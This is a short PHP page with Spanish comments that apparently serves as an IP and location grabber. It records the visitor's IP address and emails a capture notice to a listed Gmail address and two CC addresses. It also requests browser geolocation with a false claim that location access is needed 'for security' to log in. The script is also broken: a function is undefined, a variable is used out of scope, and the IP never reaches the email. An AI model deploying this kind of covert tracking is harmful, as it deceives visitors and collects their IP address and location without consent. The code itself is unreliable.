<?php
$ip = $_SERVER['REMOTE_ADDR'];
echo $ip;
include "../php scripts/Conexión.php";
include "../correos/configuracion-de-correo.php";

$mail->ClearAllRecipients();

$mail->AddAddress("dantecc10@gmail.com");
$mail->AddCC("concopia1@email.com");
$mail->AddCC("concopia2@email.com");

$mail->IsHTML(true);  //podemos activar o desactivar HTML en mensaje
$mail->Subject = 'Nueva captura de IP';

$msg = "<h1>La siguiente IP ha sido capturada:</h1>
    <p>Contenido</p>
    <p>Más Contenido...</p>
    ";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            }
        }

        function showError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("Por seguridad, debes permitir el acceso a la ubicación para iniciar sesión.");
                    break;
                default:
                    break;
            }
        }

        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
    </script>
</head>

<body>

</body>

</html>

<?php
$mail->Body = $msg;
$mail->Send();
?>